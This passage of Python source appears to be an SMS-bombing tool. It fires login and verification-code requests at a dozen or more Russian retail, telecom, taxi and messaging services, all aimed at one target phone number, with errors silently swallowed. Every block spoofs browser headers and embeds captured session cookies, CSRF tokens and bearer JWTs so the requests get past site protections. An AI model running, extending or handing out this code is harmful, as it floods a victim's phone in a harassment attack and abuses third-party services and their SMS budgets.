                'Cookie': 'city=izhevsk; city_is_confirmed=1; XSRF-TOKEN=eyJpdiI6IlZwTE9tYUtoVTZhVkpYQ3JnUW9PbFE9PSIsInZhbHVlIjoidWlST2xNa1pvbzVRdDVqY1daRTVQYXBuK25Mb1R6bFR3bG5SYUJZZ05wYVZHQ3BIcjBVZXBGOFNlYVdLUUMrMWU4cGpHRnZlcHV5N2tGdThIbWdiMGc9PSIsIm1hYyI6ImNiYTQ2YzcwMDk5ZGE4YzJiMDE3NTcxOTJhNDVjMjViYTY1NWI0NGYxMDI2ODEzNDYyMDQ4Mzc1NzJiZWMxMWQifQ%3D%3D; b-apteka_session=eyJpdiI6IjcrTWJyM21aa3lvME1UaXcrRVIxWkE9PSIsInZhbHVlIjoiN29pME5hZ05RYU9Cc2lVMW1Vdk0yMG4zUjBhVUdaUFwvWnFYNzBubG9TNkdPcnk0WDZZRE00c1BTRlRISXRhczdxMm5QTWYrOTlaWDVORGFsMmszdmJ3PT0iLCJtYWMiOiJmNWRkYzJhMWMzMWUyYTY3MzBlOGQzNWFmOTdkYjA3OWE4ZTIyOWE1NDI3ZTU2OWNmYzA1MDRhYzM3ZTgwZGFmIn0%3D',
                'Host': 'b-apteka.ru',
                'Origin': 'https://b-apteka.ru',
                'Referer': 'https://b-apteka.ru/lk/login',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                "phone": number,
                "_token": "G342Mr1Pf7bDbpQ3qdqxByzuyjG08yHr8i9TbtpR"
            }

            requests.post('https://b-apteka.ru/lk/send_confirm_code', json=payload, headers=header )
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzYzZkY2UzMy1jNDMyLTRhZmUtODUzOC0zYzQ5NjJiNTc0MjUiLCJqdGkiOiI2MzZjMTNmYzU4NWJkOGQ1NTAxZWMyOWQiLCJleHAiOjE2ODM1NzkzODgsIm5iZiI6MTY2ODAyNzM4OCwicm9sZSI6IlNoYWRvd1VzZXIiLCJpYXQiOjE2NjgwMjczODh9.nPD3aWSEvn_5HAZmb8aa5NZGWwQ7oN24vwUN2QwzYqRwRql6IuaHBnBtXRNfSM1BAGYLNXWh1xvntV4Co6nP24eBfXas-I6oPGjPtnVHOqKLFbFGpgwg5AiMH4vKlsbh-6HiZV2P3v-3lk685Qbxj0dOyaVc8d3lXC9dFd0cTHpKp7QVkCBGzv1CiAI_hZlalP1vFri2-X-O6sdim7yCx2T33BTilpMSXPqAZhy_tZzddkuZfVfELsiInQqDpcKhjWmxYzuu13wIEmGbOodQt5EMyNsU1wHGI7N7px1sejkKlcA-3vF_3zncVBCqQfvbr6tBLolNGGmH7Z5vvcf1XlYGXIdhSAKnUFrxA--53gec5g4XyXqDZV_ostx3U3DXPDZGcvdX2kNBYOUtYLHenNWB9tFD0JTludTAWHQk-aMMiMSNwQHvE_Pc8B0Ctal0ILkfZiKL8rlpm78ifLKeL095Eskp07qXRFKKt65Cp0jdyr31AiYoONyUHqLc6ja0ADLhkG4QsddYryFynFTOQA3g0uVMdnrOG6Jyk4JX8aQTSjWIfu5SoqZ40aa_f6IAO6jF7O_A7Evesyi3a0RhDFldPCQWeza3ZCjO0Pdvm3QgpRLM81y1-oxIXjToMzk6MGq4-CtlCCEVstMWAo7USwhs_fs8O0SgkyhFC2VTFAA',
                'Connection': 'keep-alive',
                'Content-Length': '38',
                'Content-Type': 'application/json',
                'Host': 'api.apteka.ru',
                'Origin': 'https://apteka.ru',
                'Referer': 'https://apteka.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user,
                'user-session-id': '1668027410784_d4efa936f6ded',
                'X-ACTIVE-EXP': 'M_y62n5aTfefCwX7mHK1qQ:0;lppkCQVBQwWa4F1lWb3Fag:0'
            }

            payload = {
                'phone': num2,
                'u': "U"
            }

            requests.post('https://api.apteka.ru/Auth/Auth_Code', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'fr-FR,fr',
                'content-length': '18',
                'content-type': 'application/json',
                'cookie': 'language=ru-RU; user-separator=part1; language=ru-RU; session-cookie=1726063975251ab3f60c6a976940ac7285525d89dcb927fe1d60ec46cae73ef49059592ea3ef326a51e3f2f08d6353e1; auth_state=NOT_AUTH; kc_config={%22realm%22:%22tele2-b2c%22%2C%22clientId%22:%22digital-suite-web-app%22%2C%22url%22:%22%22%2C%22updateTimeBeforeExpiration%22:60%2C%22defaultRefreshInterval%22:60%2C%22requestSetTokenTimeout%22:15%2C%22requestSetTokenRetry%22:2%2C%22requestSetTokenRetryDelay%22:2%2C%22requestUpdateTokenTimeout%22:10%2C%22requestUpdateTokenRetry%22:8%2C%22requestUpdateTokenRetryDelay%22:2%2C%22cookieDomain%22:%22.tele2.ru%22%2C%22isActive%22:true%2C%22smsCodeLength%22:6%2C%22migration%22:true%2C%22skylinkCookieDomain%22:%22.skylink.ru%22}; Test_try={%225500001%22:1}; csrf-token-name=csrftoken; JSESSIONID=yC1eMKbGBrnLyukyFZ7-at-Q5ZKp8MA6JlTGL06bkjt_o0QFjCZQ!-550992005; NSC_ESNS=a0366d2d-14a5-136c-9678-c223c06207fc_0765662115_1895704033_00000000019867210692; csrf-token-value=1726063c60de4ab6c4943efca7bc968c764caec84dde01522c0a8f7ae9d5608427191ccb48f76353',
                'origin': 'https://msk.tele2.ru',
                'referer': 'https://msk.tele2.ru/?pageParams=askForRegion%3Dtrue',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'tele2-user-agent': 'web',
                'user-agent': user,
                'x-ajax-token': 'b382122191e9582bd66d958796abe7397c63a42c493c56ca4b8acfc965e7b11c',
                'x-csrftoken': '172606399efc805c7c4123a0dfeff94afb700ee884ccd72ecf2206201ee028c941f18bf7f5acf1e8',
                'x-request-id': 'HVRe0j56mcGaJpdnoFXqxBg89wQfLsA7OkvDzurS',
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'sender': "Tele2"
            }

            requests.post(f'https://msk.tele2.ru/api/validation/number/{number}', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
                'cookie': 'favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; _cfuvid=7qo8NDtZ3jsi4WBHzUZ1snKrNVf93UHPrbDxrEKBVTc-1668027960075-0-604800000; searchPlaceholder=Apple%2520MacBook; BASKET_COUNT=0; __cf_bm=FUlOJxiHHM2NF7yFFQqufh5_RxESugWb5_Gt93wl8Fw-1668027962-0-AUwqQ15CtADoXAccMeA3g0WbzmrgCD2/QcylobSrjQdLiQx1cJfIsx+AGxZCn0ZH21eecYku/+MJ07yrSE3tSrQY/RjEr4r9V4a8ZJsYdmI9f27uS9tdy0FEuyTpuyHcty6s6eGB7+V0UkUkn4A/Hkt81gTBzVLAKShMCv7SUKwb0oYRN35EAd5y3SGSzZHghg==',
                'origin': 'https://www.svyaznoy.ru',
                'referer': 'https://www.svyaznoy.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            requests.post(f'https://www.svyaznoy.ru/api/v2/sms-verification-code/{number[1:]}', headers=header)
        except:
            pass
        try:
            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:]}"

            header = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'fr-FR,fr',
                'content-length': '38',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': f'PHPSESSID=YWIt431vw9nAZFsQkfDmZmk2XxczAqwN; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A44%2C%22EXPIRE%22%3A1668113940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BXMT_PHONE=%2B{num2}',
                'origin': 'https://airsoft-rus.ru',
                'referer': 'https://airsoft-rus.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'phone': '+'+num2,
                'register': True
            }

            requests.post('https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Length': '16',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'PHPSESSID=uutvbqgetdp7hrktod41sk70b3; _fbp=fb.1.1668028718954.379549720',
                'Host': 'www.frotels.com',
                'Origin': 'https://www.frotels.com',
                'Referer': 'https://www.frotels.com/appsendsms.php',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'iframe',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user
            }

            payload = {
                'mobno': number
            }

            requests.post('https://www.frotels.com/appsendsms.php', data=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '78',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'PHPSESSID=kqHvVhJMJxReBr43AgEKDDxHDK25kKQj; UF_USER_BUY_SITE=N; UF_USER_AUTH=N; BITRIX_SM_REGION_ID_3=3872; SERVERID=bitrix01; _vv_card=A402373; uxs_uid=fc4ab260-6074-11ed-a0f3-ad444ac21518; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvkusvill.ru%252F; mgo_uid=KDaOurSlPJ0EOsvPrWNW; mgo_cnt=1; mgo_sid=nlnhrl3nhw110019tpi4; WE_USE_COOKIE=Y',
                'origin': 'https://vkusvill.ru',
                'referer': 'https://vkusvill.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'FUSER_ID': '235877642',
                'USER_NAME': '',
                'USER_PHONE': num2,
                'token': '',
                'is_retry': ''
            }

            requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ru',
                'content-length': '60',
                'content-type': 'application/json',
                'dnt': '1',
                'origin': 'https://wheely.com',
                'referer': 'https://wheely.com/',
                'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user,
                'x-wheely-sign': 'eyJ0eXBlIjoiY2FwdGNoYSIsInNpZ25hdHVyZSI6IlAwX2V5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp3WVhOemEyVjVJam9pTkVkemJqUnlaMVpTUjAxMWNFZHNiMGxLT0ZwT1NURjNTMVpxWjBkNGVqWmhSVEUwZVd0SVEyTlJWR2cwV0hWTE5qQndOMlZZYUVsNlEwazRTakZVTXpsalEycE9RWGw2Vm1oS2QzQjBjbGQ1TlZaQ1NVNUVaRzFsTkZGRlIydG1iMDl6TVVSaFoyeDJaVnBIVnpObGFGWXpZa1kyY1VZeFdIQXpZa3c0TVdwTVJVaFhkbTQ0Ymtvek1GZE5SRUUzZFhSWVdsSjVTblIzWjNBeU1sTkZNemhEVjFCa1JGZGFSMXBpTXprNE5HSXlOa3huZURWVmJHaFdhRkZQYnpCcGRHbGFkMnRSZWpBclRVTTJka2t3ZFVOdFNHOURRbXhOUVUwM1dWVm1aVTQ0TDI5c04yRm9XbUY2TW1GMFYyMW9Ra2h0TkZaeFlUTkZOa1ZsT0VWdlJtOWtRWE12Y0VOdU1IbERXbk42T0M5VWMxYzJZVTlGYnpoQk5EZEdhbUprZWpaYU5XeEdObUU0VjBzd1UzQkJOVFZPYm1samEyWnRlVXRuWjBOeVQwaEhXRVJvV1RkamJIRTRObTltTTNkaVUyaHRhbUZMV0NzNU9EbFZla2RXVDB4WlJ6VXpVRzQxV1dGSkwzQXZRbUZXWWpaUFYzY3pjRWxOVUZGeFUzSnFPVW80ZG5KQmVscEtVV3RtYUdWU1JtTjFSUzlwYmxSVFF6Sk1RelZxT1VoSU4xZzNVRlJoTXpCWldrZ3JUVmxQUm1RNE9XRTBUbmhrUmtzcmJFTmhhMlYwV0UwMFdIaGplRFV3UTFKSVpWVlRaek5zYTFaVlZIaExVVGx0Wmxwa04wUlphRXhUWVRodU1DOURiSGhIVVdGcFdVOXhjRWg0U0RCeFdsSXpjM1ZIUjBWak4ySTBVRmxJWjNaaksydE5hVU41U0ZFemFWWnVRemxGVFhkNFJHdDZVMmM0ZEZocWVHZENlbnB3YjFJelNscFhRM2hsWkZZMGNUWjNlak15TkVoUmNtVnFjbWN3YWs0eWFYaDRlWHBsWlRBM1VsTXdTMnBzTVRkbmNVNDJkM0ZWVVM5V1V6VTNNM1JTZUdwS1JYVjVOV2RZWlc1WU5VRlFjRFpZYmxaWldUa3JXRTVxZUd4bFozVXZZVTB2Y1V4UU9Xb3ZjMHQxSzA5WWFrOUdTemxKUTBnM05EZHJjRWN5TTJreFkxcExRVzg0V21neWNsVnJhblpzUTA1cmVsUnBRV3QzTXpabk55ODJVWE01YXpaU1IwNXNjM0ZWTldwS1drcHhMMVF5ZEVwVk9WRnJlRzFoTUdzMFlXdHliR2Q1UkZGVVZtaHBlV1ZFV1ZWVGNYSkhUM0oxY1haYU1TOXRNbEJuVGpkV01FVXZOMjFaYUdGelNESnVTR2RpVTBsamVXcFdhVmQwVW5KUlFtbFVjVzlVZW05blpUbFFjMFpwTlhCUVFubEdUVFpOVDFWNFRuRnFWV2xOUkdKT00wTlFWRVpyWTNBNE5FTkpaV1pNTm1Kck5FSjZZM29yU21OdFNqSm9jV3RrZFRoSU5UWjNWRmRJUjNWUE1uUlFkWFJGWW1KTU9FdHVXRmh0TlRWNlUwbHJUVXB3YTBGeFRGZ3JSV3cwYkZwSFNETTRTM05qY0RFd09DczJNV2RpU2tGRFoyWkNWa2hXYURkbFRqUkpUbEpUVEdVeGIyWjZPWFZHWlhkV1drSXpZa05oUTBkMGRuUm1Ta1pHVUhwWFluWm9NM0ZqSzNWYWEzbHBOR056WTBsT2QzSndRMVJZY2sxR05XaGhiVXBOTm0xd1NEWTVkRzB2V0had1NVZG9aWEF3VFhCcGNHVkxXREV5VDFCM09ERjFjRU5YVDJSMU4wbHlabk5wUW1waVFrUkdOMHBxY0dkaVowOTVkMUZaWTFSeWVFODFTWGhzZFRkWWNVOUVjbEpLYVRSalZUTnJOM3AyVjJSTlpVNDVjV1pTU0hkeVowSk1PR3MyVUhCYU5DOXpjSFJ3TXpJNVEzVXZLM2hIVUdjemJtdFhXV3RSZFd4SmRWRlZUV3hSUTI5UVkxQlhNV3Q2WVVsRGNrVnllVGhEVkRSUVZsaGxWa2xYVEhrNWRHWjRaak5KVkdoTFpERm9NV2hGWWpsVFNtaHljRVY1TVhGaGVIVTJaeXRqZG1WQmQwRm1SVUpvZVhoTk9XeFZVMWhFUnpadlEwcDFOblJUZERWNVVGaERNRWhoYURFNGRUTXJVRFE1VEV4UmNGQkNUeXRtVkdwbVdVSjRVM1ZyZHpKc2FUTlRUbXhESzNsRlJFNUZNbmswTDJZd1dIY3dSMG8wWVdOYVFrNDNkVXhTVFdOb01YcG1NWGgwTkRGWE9WUm9iM3BtWTNKNlRucHVXRGRsY3k5dmRGaDJTM0ZMWm1OR2NHRlZNVWxSZEU1M1VXNVdjbTF5Um5wbFJuUmlkbFJZTjBkRFFrdFRVRUpyUVUxVVJuRktOR1ZOVTNoM2NrZG1kMGRUVUdSTGFDdEpWSFpXVEV4RFEwdEdhR04yZVhwWVpXOXJTWEUyTmpKd1JVbENlQ3Q2T0hwdmNHVjVhVUYyVURFek55czJSSFJSTlZwYWNISlpSbEFpTENKbGVIQWlPakUyTmpnd01qazBORFlzSW5Ob1lYSmtYMmxrSWpvek16azFNVEF6TURNc0luQmtJam93ZlEuaEQ4RHIzRFRxenRZb3JzNTQ0ZjJRQzVsQ0V6LVY1WkhDeWZJNFFtcmdpbyJ9'
            }

            payload = {
                'app_id': "55e085968a5da59241000001",
                'phone': "+" + number
            }

            requests.post('https://api.wheely.com/v6/auth/oauth/token', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '141',
                'content-type': 'application/json',
                'origin': 'https://web.icq.com',
                'referer': 'https://web.icq.com/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user
            }

            payload = {"reqId":"85231-1668029727","params":{"phone":number,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}

            requests.post('https://u.icq.net/api/v89/rapi/auth/sendCode', json=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '71',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'ipp_sign=5a947322571700607a6fdc9b442ed5ac_1654813222_82ffab69c395f4ad2da558cdfc61827d; ipp_uid=1668029836579/jPu0X4dc1c2AUqN6/qggNplKjJqoPzjoIWEfthw==; rerf=AAAAAGNsHY13FjLPA3UPAg==; PHPSESSID=Veo22h717LnuuorrRJKPL3GgrV1uvHwc; BITRIX_SM_SALE_UID=1526051370; flomni_630671829fa868097f1947da={%22userHash%22:%220b9d6713-5020-4333-88a8-44b6918de625%22}; BX_USER_ID=c35d2e5e5e9270c5b3d377e92deb5871; user_usee=a%3A0%3A%7B%7D; user_city=%D0%9A%D0%B0%D0%B7%D0%B0%D0%BD%D1%8C; ssaid=c3a548b0-6076-11ed-989f-73533c479965; __tld__=null; _gid=GA1.2.378970155.1668029873; adtech_uid=2b8530d4-7f26-4637-ae7c-24e4d7ed7efc%3Are-store.ru; top100_id=t1.7445697.1906969986.1668029873353; last_visit=1668026273358%3A%3A1668029873358; _ga_WX7VG3P9BH=GS1.1.1668029873.1.0.1668029873.0.0.0; _ga=GA1.1.1964199913.1668029873; _gat_ddl=1; _gat_ddl2=1; _gcl_au=1.1.149357349.1668029874; t3_sid_7445697=s1.1853777416.1668029873356.1668029873981.1.2; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _gp10002521={"hits":1,"vc":1}; _gpVisits={"isFirstVisitDomain":true,"todayD":"Wed%20Nov%2009%202022","idContainer":"10002521"}; ipp_key=v1668029858017/v33947245ba5adc7a72e273/HKMpCGu1Mw6dnlzPeRqtpA==; ipp_static_key=1668029858090/PY5IN4TrLEN1V172HnyLsg==; cto_bundle=JlrSOV9WODgyWEJ4OWt2V2NrODdsSDV0R3RYQVhRUENadmZHJTJCc081YTdCd0hESkRJMEtxNk1qSWtONyUyRk04JTJGcmxPV2FTRSUyRnV4Q09RdTV6QW5CUktZVjBCZ1RGamgxV2RaSW5ZeFBBamdYZTVObzNzQ0JLSkxkdU51QjFjRXNMN3FjNmVVOFFDRU90YTZTRSUyRkN0clVHOUNpWlhnJTNEJTNE',
                'Host': 're-store.ru',
                'Origin': 'https://re-store.ru',
                'Referer': 'https://re-store.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                'action': 'code_sms',
                'PERSONAL_PHONE': num2,
                'PERSONAL_EMAIL': ''
            }

            requests.post('https://re-store.ru/local/components/multisite/system.auth.sms/ajax.php', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '231',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'uid=UbGokWNsHtsam06bAwXMAg==; .ASPXANONYMOUS=aLtF3Euak0aI0S9e42PDHw; _SL_=6.83.; _ipl=6.83.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_CREDITSELECTION=Test_000195_A; AB_CREDITSELECTION_DIRECT=never; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8GIymPxtm1FFmKVQVGA7i3eSw5EuDlEAI6yoUR-lLFuhs6PZSKZSYC69yd-ImQtg7VMTVs-YREVxcAm9pTBRdll6qirhjMSoXp20s8hxsTbAL6O3BZFBlhYZ_8Nf00Qvpcpt1dmrE5oyGos4nyJcoes; __cf_bm=ZjbtEUV9dl1mEJNlE4WHlqfswV2gFvh28__bRnhiZbc-1668030211-0-AUO7xru8loJtNzO2Ffv6rNJrjJnYGpb5KYOMSIokmdlEk8VF/XY1xx/aKWrJWuHqh1Bqhq8nPhFdWeylZhzgjy1pKA+V7XExgqMhepF+s63F; _cfuvid=VvENPoiZRWhMICqFKfY413RVyf_TwT4WmJFCPZPVJiM-1668030211698-0-604800000',
                'origin': 'https://my.sravni.ru',
                'referer': 'https://my.sravni.ru/signin?ReturnUrl=%2Fuser%2Fprofile',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {
                '__RequestVerificationToken': 'CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41SftrzCGJ0NjJWXj04eT9whWjnEE37nwuELHlp42n3cj3_8E36WbypiKwpbcwu7ykP40eOWeONUwI7q_hRaxaTJ2pIqKFx5bB3tWc72gaHTsA2npAdpsIh2OA',
                'phone': '+' + number,
                'returnUrl': '/user/profile'
            }

            requests.post('https://my.sravni.ru/signin/code', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '17',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'region=1; deliveryTypeId=1; standardShopId=2527; luuid=73c0fa54-2927-4afa-a372-6004f8647bb6; suuid=d739609b-436f-4502-a032-67dba9fdc97e; XSRF-TOKEN=eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5IiwianRpIjoidXVpZDczYzBmYTU0LTI5MjctNGFmYS1hMzcyLTYwMDRmODY0N2JiNjBmZDJlNzVkMjNlMDQ5MWQ4MGRkMTgzOGU0NmY1YWYwODliMTJhYWMiLCJpYXQiOjE2NjgwMzA1OTguMjU0ODMyLCJuYmYiOjE2NjgwMzA1OTguMjU0ODM0LCJleHAiOjE2NjgxMTY5OTguMjUxNTQsInN1YiI6IiIsInNjb3BlcyI6W10sInNwbGl0X3NlZ21lbnQiOjl9.B-C8hM2_ZfrY4QdYvmqbZQFgfUbcrOYb40F_5rpzUuS086BFGi1WelZVdavOhFeUKR7o8AT9rLKIQ7SvO_i4WwB1gJ7NCPwqNq8saUHSMIqoZruJiNPOTa_fyYAJGXaOLekVK984_84tohSyVPp6CgM1HtXD8lvKSD1tnDhtP7SjFaazKnD4YwkHeT0mJsi4smjX-XsMJN9Z3A2y5-0GT6HEol93jKlXNw3wsBR_7ZJ_vpIT9waE9w-tIs21HvCW6Ad6j5Okn0lO2MtYZ5KuP63UBFj3BERVx7GJTIRKbjFMzS6tb0jw1pQkMX_k86d181wsPZagCOW9cxSMpcxP1O8rDP_MVLk-Y53c3Ap3R-3EhdWYyex74Pua6ZOBerNu_Eg6wM2KcTQQOyOY3jdtQ5BUg7orMtkmxA5ua6NGlaJeNmDqbQDwsZSMF7kbpzI5YRjg8lSy6rUHUJQCHDKCSHaVCVnO65IjNru1qZ5B0AgWeNE85vf5EgDx5IvviHzVCz4QAkztlhqpebCZ4rM992-As26eSZZN_gYY1e38xehoXFwS1tDhWr5jWQMbgOlAfSj649353BXO-iPQ10_NS81g-1579ZxF6f9HtmuGe7gm_5WtNkEpH2SSDaVasXNo45Gh23DMWGLw1JA64LfU3RNlHMdoRDPfVfgRNzzG5rs; split_segment_amount=11; 